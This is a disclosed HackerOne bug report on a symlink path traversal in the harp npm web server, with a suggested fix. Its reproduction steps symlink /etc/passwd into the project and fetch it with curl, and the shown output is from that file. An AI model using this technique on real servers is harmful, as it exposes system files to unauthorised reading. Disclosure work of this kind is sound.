# [harp] Path traversal using symlink

## Report Details
- **Report ID**: 530289
- **URL**: https://hackerone.com/reports/530289
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-04-06T18:40:03.240Z
- **Disclosed**: 2019-04-09T09:28:48.626Z

## Reporter
- **Username**: skyn3t
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
In reference to #453820

# Module

**module name:** harp
**version:** 0.29.0
**npm page:** `https://www.npmjs.com/package/harp`

## Module Description

zero-configuration web server with built in pre-processing

## Module Stats

2,679 downloads in the last week

# Vulnerability
Path traversal using symlink.

## Vulnerability Description

Similar to #403703. It can be used to list any file in another folder of web root.

## Steps To Reproduce

- Install harpjs

```
yarn global add harp
```

- Run harp server

```
harp server
```

- Create a symlink inside your project directory.

```
$ ln -s ../../../../../etc/passwd sympasswd
```

- Request the file with curl

```
$ curl --path-as-is 0.0.0.0:9000/sympasswd
root:x:0:0:root:/root:/bin/bash
...
```

## Patch
Educating users about this behaviour in the docs and probably providing a flag to disable/enable following symlinks.

## Supporting Material/References:


- Ubuntu 16.04
- node v11.3.0
- npm 6.4.1


# Wrap up

- I contacted the maintainer to let them know: Y
- I opened an issue in the related repository: Y

## Impact

You can access files outside project directory through server via symlink.

## Attachments
No attachments
